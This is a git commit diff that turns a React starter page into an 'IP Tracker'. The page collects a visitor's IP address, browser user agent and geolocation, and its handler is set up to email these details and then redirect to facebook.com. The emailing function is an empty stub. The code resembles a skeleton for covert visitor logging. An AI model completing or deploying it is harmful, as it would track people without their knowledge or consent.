500188ae4f48c303d7f45d756f96a518238be633
garfield654123 <40268889+garfield654123@users.noreply.github.com>
2023-10-04 13:18:57 +0800

    record ip and location

--- my-app/src/App.js
+++ my-app/src/App.js
@@ -1,23 +1,55 @@
-import logo from './logo.svg';
-import './App.css';
+import React, { useEffect, useState } from 'react';
 
 function App() {
+  const [ipAddress, setIpAddress] = useState('');
+  const [deviceInfo, setDeviceInfo] = useState('');
+  const [locationData, setLocationData] = useState('');
+
+  useEffect(() => {
+    // 获取访问者的 IP 地址
+    fetch('https://api.ipify.org?format=json')
+      .then(response => response.json())
+      .then(data => {
+        setIpAddress(data.ip);
+      });
+
+    // 获取设备信息
+    setDeviceInfo(navigator.userAgent);
+  }, []);
+
+  const handleSearch = () => {
+    // 查询 IP 地址的位置数据
+    fetch(`https://ipapi.co/${ipAddress}/json/`)
+      .then(response => response.json())
+      .then(data => {
+        setLocationData(JSON.stringify(data, null, 2));
+      });
+
+    // 发送相关信息的邮件
+    const emailContent = `
+      IP Address: ${ipAddress}
+      Device Info: ${deviceInfo}
+      Location Data: ${locationData}
+    `;
+
+    // 这里你需要编写发送邮件的逻辑，可以使用相应的邮件发送库或服务
+    sendEmail(emailContent);
+
+    // 将网页重定向到特定页面
+    window.location.href = 'https://www.facebook.com/';
+  };
+
+  function sendEmail(){
+
+  }
+
   return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
+    <div>
+      <h1>IP Tracker</h1>
+      <p>IP Address: {ipAddress}</p>
+      <p>Device Info: {deviceInfo}</p>
+      <button onClick={handleSearch}>Search IP Location</button>
+      <pre>{locationData}</pre>
     </div>
   );
 }
